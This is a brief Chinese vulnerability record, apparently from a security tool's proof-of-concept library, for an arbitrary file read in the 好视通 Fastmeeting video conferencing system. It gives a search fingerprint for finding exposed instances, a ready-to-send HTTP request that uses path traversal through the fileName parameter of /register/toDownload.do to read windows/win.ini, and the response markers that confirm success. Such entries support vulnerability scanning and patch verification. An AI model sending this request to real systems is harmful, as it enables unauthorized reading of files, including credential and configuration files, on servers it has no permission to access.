﻿# 好视通视频会议系统 fastmeeting toDownload.do接口任意文件读取漏洞

> 更新时间：2023-12-07

> 漏洞编号：

> 漏洞说明：视通视频会议系统的文件(fastmeeting) /register/toDownload.do?fileName= 存在任意文件遍历漏洞，可通过fileName参数读取任意文件。

> 漏洞特征：app="好视通-视频会议"

> 验证脚本：HTTP

```
GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：Dude Suite Web Security Tools - https://www.dudesuite.cn - 转载请注明出处
